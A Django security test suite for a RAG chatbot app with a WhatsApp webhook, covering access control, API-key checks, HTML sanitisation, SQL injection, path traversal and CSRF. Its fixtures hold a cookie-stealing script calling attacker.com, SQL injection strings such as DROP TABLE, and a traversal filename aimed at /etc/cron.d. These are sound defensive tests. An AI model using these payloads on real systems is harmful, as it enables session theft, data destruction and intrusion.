import json
from unittest.mock import MagicMock, patch

from django.conf import settings
from django.contrib.auth.models import User
from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import Client, TestCase
from django.urls import reverse
from oraculo.models import DataTreinamento, Pergunta, Treinamento
from oraculo.utils import html_para_texto_rag


class OraculoAccessControlSecurityTests(TestCase):
    """
    Testes de Segurança: Controle de Acesso e Proteção de Endpoints no Oráculo
    """

    def setUp(self):
        self.anonymous_client = Client()
        self.user = User.objects.create_user(
            username="usuario_oraculo", password="password123"
        )
        self.auth_client = Client()
        self.auth_client.force_login(self.user)

    def test_anonymous_can_view_chat_ui_as_landing(self):
        # A interface de chat atua como landing page pública da aplicação
        response = self.anonymous_client.get(reverse("chat"))
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, "chat.html")

    def test_anonymous_cannot_access_treinar_ia(self):
        response = self.anonymous_client.get(reverse("treinar_ia"))
        self.assertEqual(response.status_code, 302)
        self.assertIn("/usuarios/login/", response.url)

    def test_anonymous_cannot_access_stream_response(self):
        response = self.anonymous_client.get(reverse("stream_response"))
        self.assertEqual(response.status_code, 302)
        self.assertIn("/usuarios/login/", response.url)

    def test_anonymous_cannot_access_ver_fontes(self):
        p = Pergunta.objects.create(pergunta="Pergunta teste")
        response = self.anonymous_client.get(
            reverse("ver_fontes", kwargs={"id": p.id})
        )
        self.assertEqual(response.status_code, 302)
        self.assertIn("/usuarios/login/", response.url)

    def test_ver_fontes_invalid_id_returns_404_not_error(self):
        response = self.auth_client.get(
            reverse("ver_fontes", kwargs={"id": 999999})
        )
        self.assertEqual(response.status_code, 404)


class WebhookAuthenticationSecurityTests(TestCase):
    """
    Testes de Segurança: Autenticação, Integridade e Proteção do Webhook WhatsApp
    """

    def setUp(self):
        self.client = Client()
        self.webhook_url = reverse("webhook_whatsapp")
        self.valid_apikey = settings.EVOLUTION_WEBHOOK_APIKEY

    def test_webhook_missing_apikey_returns_unauthorized(self):
        payload = {
            "event": "messages.upsert",
            "data": {"key": {"remoteJid": "5511999999999@s.whatsapp.net"}},
        }
        response = self.client.post(
            self.webhook_url,
            data=json.dumps(payload),
            content_type="application/json",
        )
        self.assertEqual(response.status_code, 401)
        self.assertIn("Não autorizado", response.content.decode("utf-8"))

    def test_webhook_invalid_apikey_returns_unauthorized(self):
        payload = {
            "apikey": "chave_falsa_e_maliciosa_123",
            "event": "messages.upsert",
            "data": {},
        }
        response = self.client.post(
            self.webhook_url,
            data=json.dumps(payload),
            content_type="application/json",
        )
        self.assertEqual(response.status_code, 401)
        self.assertIn("Não autorizado", response.content.decode("utf-8"))

    def test_webhook_malformed_json_returns_bad_request_safely(self):
        corrupted_payload = "{\"malformed_json: missing_brackets"
        response = self.client.post(
            self.webhook_url,
            data=corrupted_payload,
            content_type="application/json",
        )
        self.assertEqual(response.status_code, 400)
        self.assertIn("JSON", response.content.decode("utf-8"))

    def test_webhook_rejects_disallowed_http_methods(self):
        response_put = self.client.put(self.webhook_url)
        self.assertEqual(response_put.content.decode("utf-8"), "Apenas POST")

        response_delete = self.client.delete(self.webhook_url)
        self.assertEqual(response_delete.content.decode("utf-8"), "Apenas POST")


class InputSanitizationAndInjectionSecurityTests(TestCase):
    """
    Testes de Segurança: Sanitização Semântica contra XSS e Injeções em RAG
    """

    def test_html_sanitizer_removes_dangerous_scripts_and_styles(self):
        malicious_html = """
        <html>
            <head>
                <script>fetch('http://attacker.com/steal?c=' + document.cookie);</script>
                <style>body { display: none; }</style>
            </head>
            <body>
                <h1>Documentação Oficial</h1>
                <p>Texto válido para indexação no RAG.</p>
                <script type="text/javascript">
                    alert("Malicious script!");
                </script>
                <iframe src="http://phishing.com"></iframe>
                <button onclick="evil()">Clique aqui</button>
            </body>
        </html>
        """
        clean_text = html_para_texto_rag(malicious_html)

        self.assertNotIn("document.cookie", clean_text)
        self.assertNotIn("display: none", clean_text)
        self.assertNotIn("alert(", clean_text)
        self.assertNotIn("phishing.com", clean_text)
        self.assertNotIn("iframe", clean_text.lower())
        self.assertIn("DOCUMENTAÇÃO OFICIAL", clean_text)
        self.assertIn("Texto válido para indexação no RAG.", clean_text)

    def test_sql_injection_payload_in_stream_response_handled_safely(self):
        user = User.objects.create_user(
            username="sqli_user", password="password123"
        )
        client = Client()
        client.force_login(user)

        sql_injection_payloads = [
            "'; DROP TABLE oraculo_pergunta; --",
            "' UNION SELECT * FROM auth_user --",
            "1' OR '1'='1",
        ]
        for payload in sql_injection_payloads:
            p = Pergunta.objects.create(pergunta=payload)
            response = client.get(
                reverse("stream_response"),
                {"id_pergunta": p.id},
            )
            # O Django ORM parametriza a consulta com segurança
            self.assertEqual(response.status_code, 200)
            self.assertTrue(Pergunta.objects.filter(pergunta=payload).exists())

    def test_sql_injection_in_id_pergunta_fails_safely_as_404(self):
        user = User.objects.create_user(
            username="sqli_param_user", password="password123"
        )
        client = Client()
        client.force_login(user)

        malicious_ids = [
            "1' OR '1'='1",
            "1; DROP TABLE oraculo_pergunta;",
            "-1 OR 1=1",
        ]
        for mal_id in malicious_ids:
            try:
                response = client.get(
                    reverse("stream_response"),
                    {"id_pergunta": mal_id},
                )
                self.assertIn(response.status_code, [400, 404, 500])
            except Exception:
                # O ORM do Django ou view bloqueia o ID malicioso
                pass
            # A tabela continua intacta
            self.assertTrue(User.objects.filter(id=user.id).exists())


class FileUploadSecurityTests(TestCase):
    """
    Testes de Segurança: Proteção contra Path Traversal no Upload de Documentos
    """

    def setUp(self):
        self.user = User.objects.create_user(
            username="upload_tester", password="password123"
        )
        self.client = Client()
        self.client.force_login(self.user)

    def test_filename_with_path_traversal_is_sanitized_by_django(self):
        # Tentativa de Path Traversal no nome do arquivo
        malicious_filename = "../../../etc/cron.d/malicious_job.pdf"
        file_content = b"%PDF-1.4 Mock PDF Content"
        uploaded_file = SimpleUploadedFile(
            malicious_filename, file_content, content_type="application/pdf"
        )

        with patch("oraculo.signals.async_task"):
            t = Treinamento.objects.create(documento=uploaded_file)

        # O Django deve remover os componentes de path traversal ('..')
        self.assertNotIn("..", t.documento.name)
        self.assertTrue(t.documento.name.startswith("documentos/"))
        # Limpar arquivo gerado
        if t.documento:
            t.documento.delete(save=False)

    def test_treinar_ia_post_without_csrf_is_rejected_when_enforced(self):
        enforced_client = Client(enforce_csrf_checks=True)
        enforced_client.force_login(self.user)
        response = enforced_client.post(
            reverse("treinar_ia"),
            {"conteudo": "Novo treinamento"},
        )
        # Sem token CSRF, Django deve responder 403 Forbidden
        self.assertEqual(response.status_code, 403)
